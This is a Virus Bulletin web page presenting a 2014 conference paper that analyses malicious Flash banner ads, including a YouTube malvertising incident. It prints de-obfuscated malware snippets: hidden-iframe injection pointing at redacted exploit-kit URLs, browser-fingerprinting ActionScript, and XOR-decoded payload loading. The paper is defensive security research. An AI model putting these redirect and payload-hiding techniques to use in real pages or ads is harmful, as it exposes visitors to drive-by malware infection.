<!DOCTYPE html>
<html lang="en" class="no-js">
<head>
<meta http-equiv="X-UA-Compatible" content="IE=edge">

<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

<script type="text/javascript">var BOOTSTRAP_VERSION ="lumen";
	var BOOTSTRAP_JS_HEAD =1;
	var BOOTSTRAP_CDN_ENABLE =0; var BOOTSTRAP_NAVBAR_TYPE =0; var BOOTSTRAP_LOGO_OPTION =0; var BOOTSTRAP_NAVBAR =1; var BootstrapInputFix =true;var BootstrapNavbarLineHeightFix =true;var BOOTSTRAP_EDT= 0; </script>
<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
<title>Virus Bulletin :: VB2014 paper: Optimized mal-ops. Hack the ad network like a boss</title>
<meta name="description" content="In their VB2014 paper, Vadim Kotov and Rahul Kashyap perform an in-depth analysis of malicious web ads, with the focus on Flash banners. They investigate various possibilities for an attacker to leverage ad networks to spread malware and showcase the fact that, from the attackersâ€™ perspective, ad networks are no different from, and may be even better than exploit kits." />
<meta name="generator" content="concrete5 - 5.6.3.5" />
<script type="text/javascript">
var CCM_DISPATCHER_FILENAME = '/index.php';var CCM_CID = 1746;var CCM_EDIT_MODE = false;var CCM_ARRANGE_MODE = false;var CCM_IMAGE_PATH = "/concrete/images";
var CCM_TOOLS_PATH = "/index.php/tools/required";
var CCM_BASE_URL = "https://www.virusbulletin.com";
var CCM_REL = "";

</script>
<link rel="shortcut icon" href="/files/8914/5459/9485/VBIcon.png" type="image/x-icon" />
<link rel="icon" href="/files/8914/5459/9485/VBIcon.png" type="image/x-icon" />
<link rel="stylesheet" type="text/css" href="/concrete/css/ccm.base.css" />
<script type="text/javascript" src="/concrete/js/jquery.js"></script>
<script type="text/javascript" src="/concrete/js/ccm.base.js"></script>
<script type="text/javascript">
var COOKIES_ALLOWED=false;
</script>
<link rel="stylesheet" type="text/css" href="/packages/free_cookies_disclosure/css/cookies_disclosure.css" />
<!--[if lte IE 8]><link rel="stylesheet" type="text/css" href="/packages/free_cookies_disclosure/css/cookies_disclosure_ie.css" /><![endif]-->
<script type="text/javascript">
var COOKIES_DISCLOSURE_HIDE_INTERVAL=10;
</script>
<script type="text/javascript" src="/packages/free_cookies_disclosure/js/disclosure_hide.js"></script>
<link rel="stylesheet" type="text/css" href="/packages/bootstrap/css/lumen/bootstrap.css" />
<link rel="stylesheet" type="text/css" href="/packages/bootstrap/css/lumen/bootstrap-overwrites.css" />
<link rel="stylesheet" type="text/css" href="/packages/bootstrap/css/members.css" />
<script type="text/javascript" src="/packages/bootstrap/js/common/prettify.js"></script>
<script type="text/javascript" src="/packages/bootstrap/js/common/jquery.easing.1.3.js"></script>
<script type="text/javascript" src="/packages/bootstrap/js/common/bootstrap.min.js"></script>
<link rel="stylesheet" type="text/css" href="/libraries/css/jquery.fancybox.css" />
<script type="text/javascript" src="/libraries/js/jquery.fancybox.pack.js"></script>
<link rel="stylesheet" media="screen" type="text/css" href="/files/cache/css/bootstrap/typography.css" />
<script type="text/javascript" src="/index.php/tools/packages/free_cookies_disclosure/disclosure_i18n_js"></script>
<script type="text/javascript" src="/packages/free_cookies_disclosure/js/disclosure_ajax_form.js"></script>
<link rel="stylesheet" type="text/css" href="/concrete/blocks/page_list/view.css" />
<link rel="stylesheet" type="text/css" href="/packages/remo_expand/blocks/remo_expand/templates/vbexpand/view.css" />
<script type="text/javascript" src="/packages/remo_expand/js/jquery.color.js"></script>
<script type="text/javascript" src="/packages/remo_expand/js/jquery.ba-hashchange.js"></script>
<script type="text/javascript" src="/packages/remo_expand/js/remo.expand.js"></script>
<link rel="stylesheet" type="text/css" href="/packages/bootstrap/blocks/search/templates/VB_global_search/view.css" />
<link rel="stylesheet" type="text/css" href="/packages/travisn_spacer/css/ccm.tnspacer.css" />

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.6.3/css/font-awesome.min.css" integrity="sha384-T8Gy5hrqNKT+hzMclPo118YTQO6cYprQmhrYwIiQ/3axmI1hQomh7Ud2hPOy8SP1" crossorigin="anonymous">

<script src="https://cdnjs.cloudflare.com/ajax/libs/prettify/r298/run_prettify.js" integrity="sha256-1SFdTXlsw0RkQ+iO0E91LDshGiIbPiTYqJto0px4wds=" crossorigin="anonymous"></script>
<!--[if gte IE 9]>
<script src="/packages/bootstrap/js/common/modernizr.js"></script>
<![endif]-->

<!--[if lt IE 9]>	
	
	<script src="/packages/bootstrap/js/common/html5shiv.js"></script>
	<script src="/packages/bootstrap/js/common/respond.min.js"></script>
	
<![endif]-->
</head>
<body data-spy="scroll" data-target=".bs-sidebar">

<div class="navbar  navbar-fixed-top navbar-default  bs-docs-nav">
<div class="navbar-inner">
<div class="container"><div class="row"><div class="col-sm-4 col-md-4 logo-position-1 col-logo">
<div class="navbar-header">
<button type="button" class="navbar-toggle btn_navbar_custom">
<span class="icon-bar"></span>
<span class="icon-bar"></span>
<span class="icon-bar"></span>
</button><div class="mobile-clearfix"></div><div class="navbar-brand navbar-brand-area"><a href="/"><img border="0" class="ccm-image-block" alt="" src="/files/4614/4535/7515/logo-big.png" width="339" height="92" /></a></div> </div>
</div><div class="col-sm-8 col-md-8 logo-position-1 col-nav"> <div class="nav-collapse collapse nav_collapse_custom navbar-collapse"> <div style="clear:both"></div>
<div class="vb-global-search-div">
<form action="/index.php/global-search-results/" method="get">
<fieldset>
<input name="search_paths[]" type="hidden" value="" />
<input name="query" type="text" class="vb-global-search" placeholder="Search site..." />
<input name="submit" type="submit" value="Search!" style="display:none" />
</fieldset>
</form>
</div>
<div class="tnSpacer" style="height:48px"></div>
<ul class="nav nav-pills"><li class=" nav-first nav-item-6299"><a href="/newsletter/" target="_self" class=" nav-first nav-item-6299 ">Newsletter</a></li><li class=" nav-item-260"><a href="/conference/" target="_self" class=" nav-item-260 ">VB Conference</a></li><li class=" nav-item-166"><a href="/testing/" target="_self" class=" nav-item-166 ">VB Testing</a></li><li class=" nav-path-selected active nav-item-160"><a href="/virusbulletin/" target="_self" class=" nav-path-selected active nav-item-160 ">Bulletin</a></li><li class=" nav-last nav-item-130"><a href="/blog/" target="_self" class=" nav-last nav-item-130 ">Blog</a></li></ul> </div>
</div>
</div><div class="clearfix"></div>
</div>
</div>
</div>
<div class="navbar-top-fixed-space "><div class="clearfix"></div></div>

<div class="container m-top-20">
<div class="row">
<div class="col-md-9 col-sm-9 col-lg-9">
<div class="titlepage" xmlns=""><div><div><h1 class="title" xmlns="http://www.w3.org/1999/xhtml"><a id="vb201411-optimized-mal-ops"></a>VB2014 paper: Optimized mal-ops. Hack the ad network like a boss</h1></div><div><p class="pubdate" xmlns="http://www.w3.org/1999/xhtml">2014-11-18</p></div><div><div class="authorgroup" xmlns="http://www.w3.org/1999/xhtml"><div class="author titlepage"><h3 class="author"><span class="firstname">Vadim</span> <span class="surname">Kotov</span></h3><span class="orgname">Bromium, Inc.</span>, <span class="orgdiv">USA</span></div><div class="author titlepage"><h3 class="author"><span class="firstname">Rahul</span> <span class="surname">Kashyap</span></h3><span class="orgname">Bromium, Inc.</span>, <span class="orgdiv">USA</span></div><b class="editedby">Editor: </b><span class="editor"><span class="firstname">Martijn</span> <span class="surname">Grooten</span></span></div></div><div><div class="abstract" xmlns="http://www.w3.org/1999/xhtml"><p class="title"><b>Abstract</b></p><p>In their VB2014 paper, Vadim Kotov and Rahul Kashyap perform an in-depth analysis of malicious web ads, with the focus on Flash banners. They investigate various possibilities for an attacker to leverage ad networks to spread malware and showcase the fact that, from the attackers&rsquo; perspective, ad networks are no different from, and may be even better than exploit kits.</p></div></div><div><p class="copyright" xmlns="http://www.w3.org/1999/xhtml"><i>Copyright &copy; 2014 Virus Bulletin</i></p></div></div><hr /></div>
<div class="ccm-remo-expand">
<div id="ccm-remo-expand-title-2717" class="ccm-remo-expand-title ccm-remo-expand-closed" data-expander-speed="200">Table of contents</div><div id="ccm-remo-expand-content-2717" class="ccm-remo-expand-content"><div class="toc"><dl><dt><span class="sect1"><a href="#id3073474">Abstract</a></span></dt><dt><span class="sect1"><a href="#id3332289">Introduction</a></span></dt><dt><span class="sect1"><a href="#id3608653">YouTube case study</a></span></dt><dt><span class="sect1"><a href="#id2684049">Leveraging ad networks for client fingerprinting</a></span></dt><dt><span class="sect1"><a href="#id3978739">Attacking from malicious Flash banners</a></span></dt><dt><span class="sect1"><a href="#id3146441">Summary and conclusion</a></span></dt></dl></div></div></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id3073474"></a>Abstract</h2></div></div></div><p>In this paper we perform in-depth analysis of malicious web ads with the focus on Flash banners. We investigate various possibilities for an attacker to leverage ad networks to spread malware. Then we showcase the fact that, from the attackers&rsquo; perspective, ad networks are no different from, and may be even better than exploit kits &ndash; thus making them a viable candidate for the next primary attack vector. Finally, we explore how current security technologies are ineffective against attacks propagated through ad networks.</p></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id3332289"></a>Introduction</h2></div></div></div><p>A significant part of the web economy is based on web advertising. Banner networks such as <span class="emphasis"><em>DoubleClick</em></span> [<span class="citation"><a href="#citation.1">1</a></span>] can be seen on most commercial websites and are visited by millions of users every day. By visiting a website, we implicitly allow a number of third-party JavaScript and Flash programs to execute in our browsers, and this raises some huge security concerns. </p><p>One of the most popular attack vectors nowadays is drive-by-download &ndash; a malicious page serving malware through browser and plug-in exploits. The attack begins when a victim visits a malicious website, from which they are redirected to the exploit kit page. Various methods of redirection are possible: an iframe tag, a JavaScript-based page redirect, etc. The exploit kit page then returns an HTML document containing exploits, which are usually hidden in an obfuscated JavaScript code. If at least one exploit succeeds, the victim is compromised. Successful exploitation means that the injected shellcode has finished flawlessly and hence accomplished its task: to download and execute a malicious program. The key component in this scenario is the redirect page, which is usually a compromised website, spam or a targeted email. Lately, cybercriminals have started using ad networks for this purpose. In this case, one does not actually need to hack a website or bother with spam dissemination. One only needs to use one of the hundreds of web advertising services to reach millions of Internet users.</p><p>The problem of malicious ads has been around for a while and there are a handful of papers addressing it. In 2007, Provos <span class="emphasis"><em>et al. </em></span>included rogue ad networks in their extensive study of web malware [<span class="citation"><a href="#citation.2">2</a></span>], but the major focus was the emerging problem of exploit kits. In the 2009 paper by Ford <span class="emphasis"><em>et al. </em></span>[<span class="citation"><a href="#citation.3">3</a></span>], an attempt was made to investigate the problem of malicious Flash banners. The paper is focused on the detection and classification of rogue SWF files and showcases an attack scenario of a malicious ActionScript 2.0 program. Later, a broader theoretical study was conducted by Angelia and Prishva [<span class="citation"><a href="#citation.4">4</a></span>], addressing the problem of malvertising. It investigates the different sides of the advertising market and covers several security-related problems, from malware distribution to privacy violation. All of these papers lack a significant number of samples, use cases of malicious adverts, and approach the problem from the defensive perspective. In this paper, we summarize our findings regarding in the-wild Flash banners and look at the properties of ad networks that could be leveraged by an attacker.</p><p>Malicious adverts are closely entangled with exploit kits and are used as redirects to the pages serving malware via drive-by-download attacks. The most dangerous type of web ad is a Flash banner. The prevalence of <span class="emphasis"><em>Adobe Flash Player </em></span>is enormous. According to <span class="emphasis"><em>Adobe</em></span> statistics [<span class="citation"><a href="#citation.5">5</a></span>], as many as one billion Internet users have <span class="emphasis"><em>Adobe</em></span>&rsquo;s Flash plug-in running in their browsers. The danger of Flash redirects is that they don&rsquo;t do anything malicious <span class="emphasis"><em>per se</em></span>, and therefore it&rsquo;s extremely hard to detect and block them. In this paper, we demonstrate how ad networks could be deployed for the same purposes as exploit kits, and discuss how a number of exploit kit features could be in fact be &lsquo;outsourced&rsquo; to the ad network.</p></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id3608653"></a>YouTube case study</h2></div></div></div><p>We started our investigation with an incident we encountered in February 2014 [<span class="citation"><a href="#citation.6">6</a></span>]. A <span class="emphasis"><em>YouTube</em></span> page was spreading malware though the code presented in the advertising network. The scheme of the attack is presented in <a href="#figure.1">Figure 1</a>.</p><div class="figure"><a id="figure.1"></a><div class="mediaobject"><img alt="Workflow of the YouTube incident." src="/uploads/images/figures/2014/11/Kotov-1.jpg" /></div><p class="title"><b>Figure&nbsp;1.&nbsp;Workflow of the YouTube incident.</b></p></div><p>Redirection code was found in the SWF file. It leveraged the ExternalInterface API that allows the calling of the JavaScript function from Flash movies. The attack consists of the following steps:</p><div class="orderedlist"><ol type="1"><li><p>Fingerprint the browser.</p></li><li><p>If the browser is either <span class="emphasis"><em>Internet Explorer </em></span>or <span class="emphasis"><em>Opera</em></span>: </p><div class="orderedlist"><ol type="a"><li><p>concatenate the obfuscated URL with the obfuscated JavaScript redirect code</p></li><li><p>call ExternalInterface.call(deobfuscate(&lt;obfuscated redirect code + URL&gt;)).</p></li></ol></div></li></ol></div><p>After de-obfuscation, the following JavaScript code is executed:</p><pre class="programlisting">function () {
   var E = document.createElement(&lsquo;iframe&rsquo;);
   document.body.appendChild(E);
   var ATR = E.attributes;
   var AW = document.createAttribute(&lsquo;width&rsquo;);
   AW.nodeValue = &lsquo;0&rsquo;;
   ATR.setNamedItem(AW);
   var AH = document.createAttribute(&lsquo;height&rsquo;);
   AH.nodeValue = &lsquo;0&rsquo;;
   ATR.setNamedItem(AH);
   var AB = document.createAttribute(&lsquo;frameborder&rsquo;);
   AB.nodeValue = &lsquo;0&rsquo;;
   ATR.setNamedItem(AB);
   var AS = document.createAttribute(&lsquo;src&rsquo;);
   AS.nodeValue = &lsquo;&lt;URL serving Styx exploit kit&gt;&rsquo;;
   ATR.setNamedItem(AS);
}
</pre><p>The code adds an iframe to the DOM layout of the page. In turn, the iframe points to a URL serving an instance of the Styx exploit kit. Together with malicious code, the advertisement also contained the following MouseClick handler so that it could act as a normal web banner:</p><pre class="programlisting">private function FuncOnClickBan.ner(param1:Event) : void {
   navigateToURL(new URLRequest(root.loaderInfo.parameters.clickTAG),&rdquo;_blank&rdquo;);
}
</pre><p>To investigate the matter further, we collected and aggregated <span class="emphasis"><em>Google Safe Browsing</em></span> URL analysis results from 26 March to 1 June 2014 to estimate the rates of malware prevalence on YouTube.com. We assume that, since no compromises of YouTube.com itself have been reported recently, all the malicious content comes from the adverts. <a href="#figure.2">Figure 2</a> shows the percentage of malicious pages of all the pages on YouTube.com checked by the <span class="emphasis"><em>Google</em></span> crawler.</p><div class="figure"><a id="figure.2"></a><div class="mediaobject"><img alt="Percentage of malicious pages on YouTube.com over two months." src="/uploads/images/figures/2014/11/Kotov-2.jpg" /></div><p class="title"><b>Figure&nbsp;2.&nbsp;Percentage of malicious pages on YouTube.com over two months.</b></p></div><p>We see that the trend is decreasing, however it&rsquo;s quite a minor change (about 0.015%), and there are spikes from time to time that could indicate the start of malvertising campaigns. <a href="#figure.3">Figure 3</a> shows the categories within the malicious pages (they might overlap since they cover different aspects of attacks).</p><div class="figure"><a id="figure.3"></a><div class="mediaobject"><img alt="Categories within malicious pages on YouTube.com." src="/uploads/images/figures/2014/11/Kotov-3.jpg" /></div><p class="title"><b>Figure&nbsp;3.&nbsp;Categories within malicious pages on YouTube.com.</b></p></div><p>Interestingly, the results indicate that there are more trojans than exploits and new processes. A possible explanation could be that <span class="emphasis"><em>Google</em></span>&rsquo;s engine detects the attack <span class="emphasis"><em>after</em></span> it has been planted on the victim machine, and thus fails to detect the exploitation stage. Indirectly, this indicates that malware developers pay a lot of attention to scanners and crawler bypasses. Between 7 May and 21 May, the number of scripting exploits dropped, while the number of trojans increased dramatically. This could indicate an overall improvement in malicious content obfuscation (possibly switching from pure HTML/JavaScript code to SWF). This supports the assumption that it is getting harder to detect the exploitation stage.</p><p>The number of malicious domains fluctuates slightly, but the trend is pretty much stable, as shown in <a href="#figure.4">Figure 4</a>. </p><div class="figure"><a id="figure.4"></a><div class="mediaobject"><img alt="Malicious domains and intermediaries." src="/uploads/images/figures/2014/11/Kotov-4.jpg" /></div><p class="title"><b>Figure&nbsp;4.&nbsp;Malicious domains and intermediaries.</b></p></div><p>Statistics show that the incidence of malicious banners on <span class="emphasis"><em>YouTube</em></span> is low, but stable. From the attacker&rsquo;s perspective, a video-hosting page is an attractive target since a user stays on the same page for several minutes while watching the video &ndash; enough time for long redirects and complex exploits to execute.</p></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id2684049"></a>Leveraging ad networks for client fingerprinting</h2></div></div></div><p>An advertising network is a web service that allows advertisers to display their banners on a variety of websites. Of course, the owners of these websites have mutually beneficial agreements with the advertising agency. <a href="#figure.5">Figure 5</a> shows how all the parties involved interact with each other.</p><div class="figure"><a id="figure.5"></a><div class="mediaobject"><img alt="How ad networks work." src="/uploads/images/figures/2014/11/Kotov-5.jpg" /></div><p class="title"><b>Figure&nbsp;5.&nbsp;How ad networks work.</b></p></div><p>The complex and diverse infrastructure of ad networks relies heavily on third-party content such as images, text and rich media (video, Flash animation, etc.). While text and images could hardly be used for attack purposes (unless, say, an image exploits some vulnerability in the image processing part of the browser), rich media provides all the means necessary for attack. The advertising policy does not really place any restrictions on how a banner should operate. An attacker needs only to make sure that it can act as a normal advert in order to get approval from the advertising network.</p><p>One of the key features of ad networks is the ability for the advertiser to target certain audience sectors. The biggest ad networks are engaged with search engines, social networks and entertainment portals. Let&rsquo;s examine <span class="emphasis"><em>DoubleClick</em></span>&rsquo;s targeting criteria [<span class="citation"><a href="#citation.7">7</a></span>]. It allows selection of audience parameters including:</p><div class="itemizedlist"><ul type="disc"><li><p>Language</p></li><li><p>Country</p></li><li><p>Browser</p></li><li><p>Operating system</p></li><li><p>Device</p></li><li><p>Topic of the search query or web page.</p></li></ul></div><p>Similar functionality is usually implemented in exploit kits[<span class="citation"><a href="#citation.8">8</a></span>], but in this case it is handled completely by the advertising network. Setting the operating system to <span class="emphasis"><em>Windows XP</em></span> and the browser to <span class="emphasis"><em>Internet Explorer </em></span>allows an attacker to use old exploits that are publicly available and always proven to be effective. With this configuration they don&rsquo;t need to worry about such defences as ASLR, EMET, etc. Language and country parameters allow an attacker to focus on a specific geographical location, which is handy if the attacker has a working scheme of monetizing stolen bank cards or victim personal data in a particular country. </p></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id3978739"></a>Attacking from malicious Flash banners</h2></div></div></div><p>All the exploit kits to date have relied on JavaScript to perform such tasks as browser/plug-in fingerprinting, exploit selection and data obfuscation. Flash is used either to exploit a vulnerability in <span class="emphasis"><em>Adobe Flash Player</em></span> or to support other exploits in building ROP shellcode [<span class="citation"><a href="#citation.9">9</a></span>], [<span class="citation"><a href="#citation.10">10</a></span>]. However, in banner networks, Flash movies are the most popular media, and security policies for SWF files are pretty loose. Web advertising involves a number of parties, such as the ad network showing the banners, the websites embedding the ads, and the resources provided and controlled by the advertiser. This, for instance, allows communication between Flash and JavaScript, which was leveraged in the <span class="emphasis"><em>YouTube</em></span> attack.</p><p>In general, there are three ways to attack from a Flash banner advertisement:</p><div class="orderedlist"><ol type="1"><li><p>Redirect a user to a malicious page after clicking on the banner. </p></li><li><p>Add a stealthy redirect to the page in the form of an iframe.</p></li><li><p>Attack from the banner itself.</p></li></ol></div><p>The general scenario of the attack is presented in <a href="#figure.6">Figure 6</a>.</p><div class="figure"><a id="figure.6"></a><div class="mediaobject"><img alt="Malicious Flash banner attack scenario." src="/uploads/images/figures/2014/11/Kotov-6.jpg" /></div><p class="title"><b>Figure&nbsp;6.&nbsp;Malicious Flash banner attack scenario.</b></p></div><p>The URL to which a banner leads is provided to SWF via ClickTag [<span class="citation"><a href="#citation.11">11</a></span>] &ndash; a parameter specified in HTML. Nowadays, this is a <span class="emphasis"><em>de facto </em></span>standard for all the major ad networks, but it&rsquo;s really hard to verify that the URL passed to a Flash movie remains the same and doesn&rsquo;t get transformed or replaced by a malicious one. </p><p>The current version of ActionScript is 3.0, but the older one (2.0) is still in use. Both have sufficient capabilities for user redirects and malicious code execution. The difference between them, from the software development point of view, is that 2.0 was more of a supplement for Flash&rsquo;s rich media capabilities, while 3.0 is more powerful and is a purely class-based scripting language (pretty much like Java). In fact, you do not have to use Flash IDE at all to do the job (including complex animation, audio and video manipulation) in pure ActionScript 3.0 (AS3). </p><p>In AS 2.0, Flash and HTML (JavaScript or VBScript) communication is implemented in the fscommand [<span class="citation"><a href="#citation.12">12</a></span>] class. Alternatively, the getUrl function can be used, where instead of a URL, a JavaScript snippet can be passed as an argument:</p><pre class="programlisting">getUrl(&ldquo;javascript:n=1;do{window.open(\&rsquo;http://*******.com/zha.htm\&rsquo;)}while(n==1); width=1&rdquo;, &ldquo;_self&rdquo;);</pre><p>In AS3, this is done via the ExternalInterface class [<span class="citation"><a href="#citation.13">13</a></span>]. Its method call allows JavaScript functions to be invoked on the HTML page. But as the <span class="emphasis"><em>YouTube</em></span> case shows, its functionality is not limited to calling the JavaScript functions that are defined explicitly, but it actually executes any arbitrary JS code in the form of function () { &lt;your code&gt; }. This works in <span class="emphasis"><em>Firefox</em></span>, <span class="emphasis"><em>Internet Explorer</em></span> and <span class="emphasis"><em>Opera</em></span>, but doesn&rsquo;t work in <span class="emphasis"><em>Chrome</em></span>. It allows an attacker to modify the DOM structure of the HTML page and thus redirect to a drive-by-download or exploit a potential victim straight away. In this case, malicious code is contained within the banner and must therefore be obfuscated in order to pass the security check performed by the corresponding ad network. One of the malvertising samples we saw (md5 = 98b7e6694bca78770d0e8a5c80e3992a) used the class tree to hide the malicious JavaScript code:</p><pre class="programlisting">if(ExternalInterface.available){
  storyByteArray = ByteArray(new storyClass());
  story = storyByteArray.readMultiByte(storyByteArray.length,&rdquo;iso-8859-1&rdquo;);
  if(Capabilities.screenResolutionX &gt;= 600 &amp;&amp; Capabilities.screenResolutionY &gt;= 400){
    if(Capabilities.os.indexOf(&ldquo;Windows&rdquo;) &gt;= 0){
      userAgent = ExternalInterface.call(&ldquo;window.navigator.userAgent.toString&rdquo;);
      if(userAgent.indexOf(&ldquo;MSIE&rdquo;) != -1) {
        str1 = &ldquo;function(){&ldquo;;
        str1 = str1 + story;
        str1 = str1 + &ldquo;}&rdquo;;
        ExternalInterface.call(str1);
      }
    }
  }
}
</pre><p>First, it carefully checks the environment it is running in and makes sure that it&rsquo;s a <span class="emphasis"><em>Windows</em></span> system and that the ExternalInterface class is available in the browser. Then it leverages JavaScript to check for the user-agent string. Only when it verifies that the victim is running <span class="emphasis"><em>Internet Explorer </em></span>does it invoke the JavaScript code. The payload seems to be contained in the story variable, which was initialized in the code snippet shown above &ndash; but if we look into storyClass(), we don&rsquo;t see anything malicious:</p><pre class="programlisting">public class storyClass extends ByteArrayAsset {
  public function Maina_storyClass() {
    super();
  }
}
</pre><p>However, the class inherits ByteArrayAsset &ndash; a class which allows the embedding of binary data into an SWF. Furthermore, when the instance of the storyClass is concatenated with the str1 string, it is coded implicitly into the string and returns the binary data in the superclass. The binary data turns out to be a fairly large chunk of obfuscated JavaScript. The JavaScript (after de obfuscation) contains a browser fingerprinting part based on PluginDetect. Then, if a victim uses the required version of JRE, it adds an iframe to the page:</p><pre class="programlisting">if (((J.indexOf(&lsquo;1.6.0.&rsquo;) !== -1) || (J.indexOf(&lsquo;1.7.0.&rsquo;) !== -1)) &amp;&amp; (J != &lsquo;0.0.0.0&rsquo;) &amp;&amp; (J != &lsquo;1.7.0.25&rsquo;) &amp;&amp; (J != &lsquo;1.7.0.40&rsquo;) &amp;&amp; (J != &lsquo;1.7.0.45&rsquo;)) {
  var versions = bin2hex(pdfvers + &lsquo;||&rsquo; + J + &lsquo;||&rsquo; + flashvers + &lsquo;||&rsquo; + group);
  var namef = h + &lsquo;tp://*******.net/&rsquo;;
  var divTag = document.createElement(&lsquo;div&rsquo;);
  divTag.id = &lsquo;over-holder&rsquo;;
  document.body.appendChild(divTag);
  var fr3 = document.createElement(&lsquo;iframe&rsquo;);
  fr3.width = &lsquo;11px&rsquo;;
  fr3.height = &lsquo;9px&rsquo;;
  fr3.setAttribute(&lsquo;style&rsquo;, &lsquo;left:-10000px&rsquo;);
  fr3.setAttribute(&lsquo;style&rsquo;, &lsquo;visibility:hidden&rsquo;);
  fr3.setAttribute(&lsquo;src&rsquo;, namef);
  document.getElementById(&lsquo;over-holder&rsquo;).appendChild(fr3)
}
</pre><p>Later, we discovered an updated version of this attack (md5= 9edb3fdeb9bb38fcbf1a8432ff4559a2). Neither the commercial Sothink SWF Decompiler nor the open-source JPEXS Free Flash Decompiler were able to decompile it. But by looking at the AS3.0 byte code we were able to spot the same variable names and workflow as in the previous case. However, this one also targeted <span class="emphasis"><em>Firefox</em></span> and <span class="emphasis"><em>Opera</em></span> users:</p><pre class="programlisting">00232) + 0:2 getlex &lt;q&gt;[packageinternal]::userAgent
00233) + 1:2 pushstring &ldquo;Firefox&rdquo;
00234) + 2:2 callproperty &lt;q&gt;[namespace]http://adobe.com/AS3/2006/builtin::indexOf, 1 params
00235) + 1:2 pushbyte -1
00236) + 2:2 equals
&hellip;
00250) + 0:2 getlex &lt;q&gt;[packageinternal]::userAgent
00251) + 1:2 pushstring &ldquo;Opera&rdquo;
00252) + 2:2 callproperty &lt;q&gt;[namespace]http://adobe.com/AS3/2006/builtin::indexOf, 1 params
00253) + 1:2 pushbyte -1
00254) + 2:2 equals
</pre><p>Another difference was that the JavaScript contained a number of unprintable characters, which is a primitive but quite effective method of obfuscation:</p><pre class="programlisting">00000000  4f 3d 22 2f 69 29 2e 49  28 62 03 3a 42 28 62 29  |O=&rdquo;/i).I(b.:B(b)|
00000010  7b 03 79 20 61 7d 2c 03  29 7b 43 20 03 3b 77 28  |{.y a},.){C .;w(|
00000020  03 2e 31 03 02 73 2a 28  02 02 64 03 2b 2b 29 7b  |..1..s*(..d.++){|
</pre><p>Although it doesn&rsquo;t have a native eval function, as JavaScript does, allowing execution of the source code passed as an argument, there is a way to obfuscate a Flash movie within a Flash movie. To do that the ByteArray and Loader classes are usually employed. The former class provides a means to store and manipulate binary data, while the latter allows it to be encapsulated into an AS3 object and added into the context of the current program. </p><p>Consider the following example code taken from a piece of SWF malware: </p><pre class="programlisting">key = 6301633;
payload = new Array(171143298, 6304480, 1478360505, &hellip; ); 3
bytes = new ByteArray();
bytes.endian = Endian.LITTLE_ENDIAN;
for(var i:int = 0; i &lt; payload.length; i++)
  bytes.writeUnsignedInt(payload[i] ^ key);

bytes.length = 3344;
ldr_context = new LoaderContext();
loader = new Loader();
loader.contentLoaderInfo.addEventListener(Event.COMPLETE,this.vets);
loader.loadBytes(bytes, ldr_context);
</pre><p>The code above sets up a byte array, de-obfuscates the payload, and makes the instance of the Loader class load it as if it was an image or another SWF movie. Then it registers the callback function this.vets() to be called once the loader has finished loading. In the this.vets() function, the loaded element is added to the stage:</p><pre class="programlisting">public function vets(param1:Event) : void {
  addChild(param1.target.loader as Loader);
}
</pre><p>After that, a new Flash object is created and all the code contained therein is executed. </p><p>The problem with attacking from the Flash banner directly is that there are size constraints defined by the ad network, which are usually up to 200K. The banner must look normal and should not contain any suspicious elements such as a huge chunk of high-entropy data. This constraint can be overcome by deploying steganography and hiding malicious code in the image. The AS3 code could then extract it and execute it in the manner shown above. For that purpose, for example, the hideimage [<span class="citation"><a href="#citation.14">14</a></span>] tool could be used. Although it&rsquo;s a C program, it&rsquo;s pretty small and straightforward, so it would be trivial to implement in ActionScript 3.0. <span class="emphasis"><em>Adobe Flash </em></span>provides rich capabilities for image manipulation [<span class="citation"><a href="#citation.15">15</a></span>], including reading and writing pixel data. </p><p>Although we haven&rsquo;t yet seen malicious banners that incorporate a fully functional exploit kit, it is a possibility, especially considering the targeted character of web ads. </p></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id3146441"></a>Summary and conclusion</h2></div></div></div><p>From our investigation we conclude that ad networks could be leveraged to aid, or even be substituted for current exploit kits. Loose security policies, high prevalence and powerful scripting capabilities make it a viable tool for malware distribution. </p><p>There are a number of reasons why the problem of malvertising cannot be solved by traditional means. To name a few: </p><div class="itemizedlist"><ul type="disc"><li><p>In terms of both time and resources (and hence money), the scale of web advertising is too large to allow a thorough check of every single piece of rich media.</p></li><li><p>Verifying that a file is malicious or clean is a form of the Halting Problem and thus every check is probabilistic. Furthermore, to really impact the security of web ads, the detection algorithm success rate must be higher than the percentage of malware in advertising (which, according to <span class="emphasis"><em>Google Safe Browsing</em></span>, is about 0.04%) and provide a negligible rate of false alarms.</p></li><li><p>In some cases, malicious content could be triggered by a certain condition and thus not manifest any suspicious behaviour under normal circumstances, thus passing the security checks. To discover such content, thorough static analysis is required (such as symbolic execution and taint analysis), which could be complicated given the volume of web adverts.</p></li></ul></div><p>The most popular security solutions nowadays are based on end point detection, but this is largely ineffective due to the obfuscation capabilities of ActionScript. To back up this claim we checked several not-so-fresh malicious SWF files from our collection with <span class="emphasis"><em>VirusTotal</em></span>. The results are shown in <a href="#table.1">Table 1</a>.</p><div class="table"><a id="table.1"></a><table border="1" summary="VirusTotal results for several malicious banners."><colgroup><col /><col /><col /><col /></colgroup><thead><tr><th align="center">MD5</th><th align="center">AS version</th><th align="center">VirusTotal positives</th><th align="center">Scan date</th></tr></thead><tbody><tr><td>196e889522da0964f8e148414f3cc0c</td><td>3.0</td><td>1/50</td><td>2014-02-09</td></tr><tr><td>98b7e6694bca78770d0e8a5c80e3992a</td><td>3.0</td><td>5/48</td><td>2014-02-27</td></tr><tr><td>75d155554330c93287cc7c4dc96a6631</td><td>2.0</td><td>29/46</td><td>2013-05-30</td></tr><tr><td>ffe764f6e5e8aec6d7c73de83d862b25</td><td>3.0</td><td>1/49</td><td>2014-02-09</td></tr><tr><td>5205d33eb5d8db897c691b8d081d5ad0</td><td>3.0</td><td>2/52</td><td>2014-05-20</td></tr></tbody></table><p class="title"><b>Table&nbsp;1.&nbsp;VirusTotal results for several malicious 